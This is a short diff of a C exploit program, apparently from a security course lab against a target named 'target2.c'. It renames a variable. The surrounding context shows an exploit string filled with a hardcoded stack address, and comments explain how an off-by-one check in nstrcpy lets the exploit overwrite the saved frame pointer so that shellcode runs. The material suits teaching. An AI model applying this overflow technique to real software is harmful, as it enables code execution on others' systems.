@@ -44,11 +44,11 @@ int main (void)
 {
   char *args[3];
   char *env[1];
-  long buffAddr, *addrPtr;
+  long retAddr, *addrPtr;
   char egg[EGG_SIZE]; /* string containing exploit code */
   int i;
 
-  buffAddr = 0xBFFFFC90; /* start address of buf in target2.c:bar */
+  retAddr = 0xBFFFFC90; /* start address of buf in target2.c:bar */
 
   /* First, fill the exploit string with the start address of the buf
      in bar. We will set it up such that at some point immediately 
@@ -58,7 +58,7 @@ int main (void)
      the shellcode will begin executing and we are done. */
   addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
-    *(addrPtr++) = buffAddr;
+    *(addrPtr++) = retAddr;
 
   /* The check 'i <= len' inside the for loop in nstrcpy allows us
      to overwrite the LSB of the saved ebp for the foo stack frame,
